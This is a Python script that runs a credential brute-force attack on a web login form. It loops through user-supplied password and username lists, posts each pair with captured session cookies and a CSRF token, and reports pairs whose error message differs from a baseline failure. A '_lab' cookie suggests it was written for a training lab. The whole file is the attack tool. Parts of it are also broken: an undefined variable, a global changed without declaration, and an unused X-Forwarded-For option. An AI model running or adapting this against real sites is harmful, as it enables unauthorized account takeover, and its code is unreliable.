import requests
import re

cookieValue1=" "
cookieValue2=" "
csrfValue=" "
host=" "

passlist=""
loginlist=""
pattern="p class=is-warning>(.*?)<"

result=" "

def guess_pass(login,password):
    cookie={'_lab':cookieValue1,'session':cookieValue2}
    payload = {'csrf':csrfValue,'username':login,'password':password}
    try:
        response = requests.post(host ,data=payload,cookies=cookie)
    except Exception as e:
        print(e)
    spec_word = response.text.strip()
    res_text=re.search(pattern, spec_word).group()
    res_status = response.status_code
    return res_text, res_status
 
 
def open_passlist_file(filepath):
    file=open(filepath,'r')
    lists=file.readlines()
    words=[]
    for i in range(len(lists)):
        words.append(lists[i].rstrip('\n').split(',')[0])        
    return words

try:
    filepath=input("Enter a filepath to passlist: ")
    passlist=open_passlist_file(filepath)
except Exception as e:
        print(e)

try:
    filepath=input("Enter a filepath to loginlist: ")
    loginlist=open_passlist_file(filepath)
except Exception as e:
        print(e)

def brutepass():
    response_stat=guess_pass("napewnozlylogin","napewnozlypass")[0]
    tryNr=0
    for word in passlist:
        for login in loginlist:
            tryNr+=1
            new_status=guess_pass(login,word)
            print("TRY NR: "+str(tryNr)+" pass: "+str(word)+" =  "+str(login)+" status is: "+str(new_status[1]))
            if response_stat!=new_status[0]:
                print("valid login and password can be: "+login+" : "+word)
                result+="---"+word+"="+login1
    print("result is :" + result)



supportXforward=int(input("Do web support-X-forward[1/0]: "))

if supportXforward==1:
    supportXforward=True
else:
    supportXforward=False

brutepass()
